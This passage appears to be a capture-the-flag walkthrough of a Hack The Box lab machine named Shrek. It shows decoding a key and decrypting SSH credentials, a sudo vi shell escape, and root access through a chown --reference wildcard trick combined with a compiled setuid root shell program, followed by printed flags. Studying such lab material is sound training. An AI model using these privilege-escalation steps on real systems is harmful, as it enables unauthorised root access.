iptcyxncifqpvtexvfjnmudiumlqivwstagvrnjbifdzajqprpgfnzlhjpwbilgphvjchtafklnjlnemsncnunyjxuyfhezkjssmgomewfvvhmctatdtxxadolhoygaxxbxhieueiffsosowhwbllvbuedfjrvsknoykyrginslvegybtzwfgiomsrzwjpmttrpfgpwntmotfnrkbkxrnmzpsdkyfcyglfkpripknzqcljufabkgahcvpwpxvyygturwkmwlmthwouljberugjiuzcqyazynbwoobdurdhhatdszsitywfmheqlpdiaqcisgpfatkpdi     UHJpbmNlQ2hhcm1pbmc=     epxzjhyitkbbvnpjcrezoktuxjelbaddajkermjuhhtxlqyhdyebzjlebmckkvtjthzlorpicrirjjrbmvickzuwyuxpljnoetfmsjuylneekqzkdiexicjkstosgtytmnrqfmtbokhmncdcgjqioqbiuunjmirzvofkpyeivtlfopmzkhuwkcnrmnrfumfqynouprlkqmjyxclpjloyiffnjpmsuynddytqigkwbmomespaenszbezgdrmfcodkvqgdkellracwnanqzhxhuymvzemhzauuwxyfnovoqyjolpvqhkyntjtoxmogsvwzzddcisewtsqpipwwznvkhtrzwbgfixwkpyipgrgoxthhroovjnivpeaggbjtkqxbkwjlsdlgyvvuxchbwwxremuabwgkmqutqzrxfunhdqqnqeusvxdvpzskrwhtfroosomprwucuqfrppmzwpovlpsqgcdzqckazmgrqhpuknmhnxbpzsihogulcyimyoaajdqvnsfcgujnzxjxlcpvawghuxokoionfsqycfzmuylajteynxufokdrjbwzbwhcvbvlynwdbgwgmcscoslgujacszubfgjykawumottsrlwqipfhuxntkkqqkzhmypeueafoutowwpbazhpxunckimctnvfsoahfuhgcsxmyoivmcwoolvfexujotinohsrjadmmrhggnwxlpbdytwdhqcgsebkjxvxhefvcemjuczrglvgsxnjjxtumjonkwiewjbqqbplfqkmusngyrxisvbhlnaldwzshrnnxpouaygyyzuredlwnyyyeponyaifdxvmovwsrhkeogswmnzlohzgqyxzqlxkvntgqdvapakbkxtcggbughwoxffkeasqdvnjvgdejntkzmhvsagvegcrvfsdlvozcramtsoksgaopttniysnzieuendqmesbqjxroadzmihlanpskkmwmrtlyoyvknsryztnsxjvpmufnqijuztdwtuhhueuzooqiohiedmzihbpyposaijzywrsmkyknlydmxetjkpoywmpktbidrshhhjxkicrlxwshdwmhkkeheqlekqluxbxwcrhemlsgmujtmxbtlzxlfharjbzwcjrsnzbmescudtseldkiosktvnxvmquuccznblodswzklgoxipbxjvfebvnstnkkohyiejaoysvyggyblmlyaqxkqmujwidcbggbsjzigdznipnijeqruqaetrfusgeiitgdboxwxasdruodtbtihmtgdtjgcswszvvfhvpldfequuidcdrdooncvhnhnnttnimtjcbfrthjkwnslsvbkukvjrosvjddgjlidyzepagjfpmyzmesarmlmjxcjjaogsorkwifsnigszejftnqnslszxuedvbkpfzdcejpvnchfliwelphgmjuseqcmqzzyzevpphyknmzzjdopguvvurhqscwmcdzkgawpthgyuscgijefohqftdblxcjsipsdkhcpgyndinvupd
root@kali:~/shrek/ftp#
```

```sh
root@kali:~/shrek/ftp# echo "UHJpbmNlQ2hhcm1pbmc=" | base64 -d
PrinceCharming
root@kali:~/shrek/ftp#
root@kali:~/shrek/ftp# echo "UHJpbmNlQ2hhcm1pbmc=" | base64 -d > strings
```

```sh
root@kali:~/shrek/ftp# echo -n J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc= | base64 -d
'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
root@kali:~/shrek/ftp#
root@kali:~/shrek/ftp# echo -n J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc= | base64 -d > blob
root@kali:~/shrek/ftp#
root@kali:~/shrek/ftp# cat blob
'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
root@kali:~/shrek/ftp#
```

```sh
root@kali:~/shrek/ftp# pip install seccure
Collecting seccure
  Downloading seccure-0.3.2.tar.gz
Collecting gmpy<2,>=1.15 (from seccure)
  Downloading gmpy-1.17.zip (147kB)
    100% |████████████████████████████████| 153kB 3.3MB/s
Requirement already satisfied: pycrypto>=2.6 in /usr/lib/python2.7/dist-packages (from seccure)
Requirement already satisfied: six>=1.2 in /usr/lib/python2.7/dist-packages (from seccure)
Building wheels for collected packages: seccure, gmpy
  Running setup.py bdist_wheel for seccure ... done
  Stored in directory: /root/.cache/pip/wheels/5d/39/81/c1040cc361bbc2e5425767bf8b1ff476ea2d108c2a40a7f116
  Running setup.py bdist_wheel for gmpy ... done
  Stored in directory: /root/.cache/pip/wheels/73/65/44/c399bdad733c33e009124b25859f865a2e2b2f27c0145758ae
Successfully built seccure gmpy
Installing collected packages: gmpy, seccure
Successfully installed gmpy-1.17 seccure-0.3.2
root@kali:~/shrek/ftp#
```

[``py-seccure``](https://github.com/bwesterb/py-seccure)

```sh
root@kali:~/shrek/ftp# python
Python 2.7.14+ (default, Dec  5 2017, 15:17:02)
[GCC 7.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import seccure
>>> ct = '\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
>>> ct
'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
>>> seccure.decrypt(ct,b'PrinceCharming')
'The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec\n'
>>>
```

```sh
root@kali:~/shrek/ftp# echo shr3k1sb3st! > keyphrase
root@kali:~/shrek/ftp# cat keyphrase
shr3k1sb3st!
root@kali:~/shrek/ftp#
```

```sh
root@kali:~/shrek/ftp# chmod 600 key
root@kali:~/shrek/ftp# ssh -i key sec@10.10.10.47
The authenticity of host '10.10.10.47 (10.10.10.47)' can't be established.
ECDSA key fingerprint is SHA256:elYdm7BTN0q3wYoaIdUyw1kBlMFTls2dWHgybMAYav8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.47' (ECDSA) to the list of known hosts.
Enter passphrase for key 'key':
Last login: Wed Aug 23 10:48:16 2017 from 10.10.22.10
[sec@shrek ~]$ id
uid=1000(sec) gid=100(users) groups=100(users),10(wheel),95(storage),98(power)
[sec@shrek ~]$ sudo -l
User sec may run the following commands on shrek:
    (farquad) NOPASSWD: /usr/bin/vi
[sec@shrek ~]$
```

```sh
[sec@shrek ~]$ sudo -u farquad /usr/bin/vi
```

```
:!/bin/bash
```

![](images/23.png)

```sh
[farquad@shrek sec]$ id
uid=1001(farquad) gid=100(users) groups=100(users),7(lp),10(wheel),91(video),92(audio),93(optical),95(storage)
[farquad@shrek sec]$ cd ~
[farquad@shrek ~]$ ls -l
total 12
-rwxr-xr-x 1 root root 8448 Aug 16 01:57 mirror
[farquad@shrek ~]$ ./mirror
Mirror, Mirror on the wall who is the most handsome of all?
Of course you Lord Farquad
[farquad@shrek ~]$
[farquad@shrek ~]$ exit
exit
[Hit return to continue] 
[sec@shrek ~]$
[sec@shrek ~]$
```

```sh
[sec@shrek ~]$ find / -type f -newermt 2017-08-20 ! -newermt 2017-08-24 -ls 2>/dev/null
    18518      4 -rw-r--r--   1  root     root            6 Aug 23 11:28 /etc/hostname
    18515      4 -rw-r--r--   1  root     root          389 Aug 23 13:58 /etc/netctl/static
    35103      8 -rw-r--r--   1  root     root         4606 Aug 21 19:43 /etc/vsftpd.conf
   138139      4 -rw-r--r--   1  root     root          196 Aug 23 10:18 /etc/systemd/system/netctl@static.service
    33988      4 -rw-------   1  root     root          929 Aug 21 19:53 /etc/shadow
    33931      4 -rw-r--r--   1  root     root          968 Aug 21 19:53 /etc/passwd
       17      4 -r--r--r--   1  root     root           33 Aug 22 21:19 /home/sec/user.txt
       18      0 -rw-------   1  root     root            0 Aug 22 20:58 /home/sec/.bash_history
   138145      4 -rw-------   1  root     root           97 Aug 22 20:31 /var/spool/cron/root
   138108   8196 -rw-r-----   1  root     systemd-journal  8388608 Aug 23 11:20 /var/log/journal/84d230a047b241c6be827bd5ce531868/user-1001.journal
   138101  16388 -rw-r-----   1  root     systemd-journal 16777216 Aug 21 18:37 /var/log/journal/84d230a047b241c6be827bd5ce531868/system@00055747c657656c-ad9ea2c5440b64ec.journal~
   138138   8192 -rw-r-----   1  root     systemd-journal  8388608 Aug 21 22:11 /var/log/journal/84d230a047b241c6be827bd5ce531868/system@0005574ac144c200-f23de797a5b2e762.journal~
   137786     16 -rw-------   1  root     utmp               15744 Aug 22 19:12 /var/log/btmp.1
   131087      8 -rw-------   1  root     root                7948 Aug 23 14:03 /var/log/vsftpd.log.1
   137811 264656 -rw-r--r--   1  root     root            271001726 Aug 23 14:03 /var/log/httpd/access_log.1
   137906     12 -rw-r--r--   1  root     root                 9833 Aug 23 14:07 /var/log/httpd/error_log.1
    20283      4 -rw-r--r--   1  root     root                   91 Aug 22 00:51 /usr/src/thoughts.txt
[sec@shrek ~]$
```

```sh
[sec@shrek ~]$ ls -l /var/spool/cron/root
-rw------- 1 root root 97 Aug 22 20:31 /var/spool/cron/root
[sec@shrek ~]$ ls -l /var/spool/cron
total 4
-rw------- 1 root root 97 Aug 22 20:31 root
[sec@shrek ~]$
```

```sh
[sec@shrek ~]$ cat /usr/src/thoughts.txt
That must be Lord Farquaad's castle...
Do you think he's maybe compensating for something?
[sec@shrek ~]$
```

###### Privilege Escalation using Chown file reference trick

[``Back To The Future: Unix Wildcards Gone Wild``](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt) &rarr; ``Chown file reference trick (file owner hijacking)``

```sh
[sec@shrek home]$ cd /usr/src/
[sec@shrek src]$ touch kanishka
[sec@shrek src]$ chmod 4755 kanishka
[sec@shrek src]$ ls -l kanishka
-rwsr-xr-x 1 sec users 0 Feb  3 17:29 kanishka
[sec@shrek src]$ date
Sat Feb  3 17:29:52 UTC 2018
[sec@shrek src]$ ls -l kanishka
-rwsr-sr-x 1 nobody nobody 0 Feb  3 17:29 kanishka
[sec@shrek src]$
```

```sh
[sec@shrek src]$ ls -l
total 4
-rwsr-sr-x 1 nobody nobody  0 Feb  3 17:29 kanishka
-rw-r--r-- 1 root   root   91 Aug 22 00:51 thoughts.txt
[sec@shrek src]$
[sec@shrek src]$ touch -- --reference=thoughts.txt
[sec@shrek src]$
[sec@shrek src]$ date
Sat Feb  3 17:34:07 UTC 2018
[sec@shrek src]$
[sec@shrek src]$ ls -l
total 4
-rwsr-sr-x 1 root root   0 Feb  3 17:29  kanishka
-rw-r--r-- 1 sec  users  0 Feb  3 17:34 '--reference=thoughts.txt'
-rw-r--r-- 1 root root  91 Aug 22 00:51  thoughts.txt
[sec@shrek src]$
```

``exec.c``

```
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
int main( int argc, char *argv[] )
{
	setreuid(0,0);
	execve("/bin/sh", NULL, NULL);
}
```

```sh
[sec@shrek src]$ nano exec.c
[sec@shrek src]$ gcc exec.c -o exec
[sec@shrek src]$ chmod 4755 exec
[sec@shrek src]$ ls -l
total 20
-rwsr-xr-x 1 sec  users 8496 Feb  3 17:37  exec
-rw-r--r-- 1 sec  users  143 Feb  3 17:37  exec.c
-rwsr-sr-x 1 root root     0 Feb  3 17:29  kanishka
-rw-r--r-- 1 sec  users    0 Feb  3 17:34 '--reference=thoughts.txt'
-rw-r--r-- 1 root root    91 Aug 22 00:51  thoughts.txt
[sec@shrek src]$
[sec@shrek src]$ date
Sat Feb  3 17:37:50 UTC 2018
[sec@shrek src]$
[sec@shrek src]$ ls -l
total 20
-rwsr-sr-x 1 root root  8496 Feb  3 17:37  exec
-rw-r--r-- 1 root root   143 Feb  3 17:37  exec.c
-rwsr-sr-x 1 root root     0 Feb  3 17:29  kanishka
-rw-r--r-- 1 sec  users    0 Feb  3 17:34 '--reference=thoughts.txt'
-rw-r--r-- 1 root root    91 Aug 22 00:51  thoughts.txt
[sec@shrek src]$
```

```sh
[sec@shrek src]$ ./exec
bash-4.4# id
uid=0(root) gid=100(users) groups=100(users),10(wheel),95(storage),98(power)
bash-4.4# cd /root
bash-4.4# ls -l
total 8
-rwx------ 1 root root 362 Aug 22 20:43 chown
-r-------- 1 root root  33 Aug 22 20:59 root.txt
bash-4.4#
```

```sh
bash-4.4# cat root.txt
54d3c885deb157dcb786b79814c88178
bash-4.4#
```

```sh
[sec@shrek ~]$ cat user.txt
4a30ad60401b5e0c8b0ba7ca6b08e60c
[sec@shrek ~]$
```

```sh
bash-4.4# crontab -l
@reboot /bin/rm /srv/ftp/*.txt
@reboot /usr/bin/python /root/.script.py
*/5 * * * * /root/chown
bash-4.4#
```

```sh
bash-4.4# cat /root/.script.py
# -*- coding: utf-8 -*-
#!/usr/bin/python
__author__ = 'Cowonaboat'

import uuid
import random
import string
from random import randint

PATH = '/srv/ftp/'

priv_key = 'UHJpbmNlQ2hhcm1pbmc='
ciphertext = 'J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc='
def kb_constructor(size, split_type): # Takes a size in kb
    if split_type == 'ciphertext':
        kb_size = size * 1024 # Makes it kb
        string_out_first = ''.join(random.choice(string.ascii_lowercase) for x in range(int(kb_size/2)))
        string_out_second = ''.join(random.choice(string.ascii_lowercase) for x in range(int(kb_size/2)))
        return string_out_first + " "*5 + ciphertext + " "*5 + string_out_second
    if split_type == 'priv_key':
        kb_size = size * 1024 # Makes it kb
        string_out_first = ''.join(random.choice(string.ascii_lowercase) for x in range(int(kb_size/2)))
        string_out_second = ''.join(random.choice(string.ascii_lowercase) for x in range(int(kb_size/2)))
        return string_out_first + " "*5 + priv_key + " "*5 + string_out_second
    else:
        kb_size = size * 1024 # Makes it kb
        return ''.join(random.choice(string.ascii_lowercase) for x in range(kb_size)) # Returns random string

random_file_ciphertext = randint(1,30)
random_file_b64key = randint(1,30)

while random_file_b64key == random_file_ciphertext:
    random_file_b64key = randint(1,30) # in case they get the same random int between 1 and 30

count = 0

for x in range(30): # Iterate through 10 times
    count += 1
    if count == random_file_b64key:
        rand_int = randint(3, 15) # Random size between 3kb and 15kb
        foldername = uuid.uuid4().hex + ".txt" # Append .txt so the OS recognizes it as a text file
        with open(PATH + foldername, 'w') as f: # Open a new file with the new UUID
            f.write(kb_constructor(rand_int, 'priv_key')) # Write random stuff with a random kb size
    if count == random_file_ciphertext:
        rand_int = randint(3, 15) # Random size between 3kb and 15kb
        foldername = uuid.uuid4().hex + ".txt" # Append .txt so the OS recognizes it as a text file
        with open(PATH + foldername, 'w') as f: # Open a new file with the new UUID
            f.write(kb_constructor(rand_int, 'ciphertext')) # Write random stuff with a random kb size
    else:
        rand_int = randint(3, 15) # Random size between 3kb and 15kb
        foldername = uuid.uuid4().hex + ".txt" # Append .txt so the OS recognizes it as a text file
        with open(PATH + foldername, 'w') as f: # Open a new file with the new UUID
            f.write(kb_constructor(rand_int, 0)) # Write random stuff with a random kb size


# private key in b64: UHJpbmNlQ2hhcm1pbmc=
# ciphertext ECC encrypted with seccure:
# ftp location: /srv/ftpbash-4.4
#
```
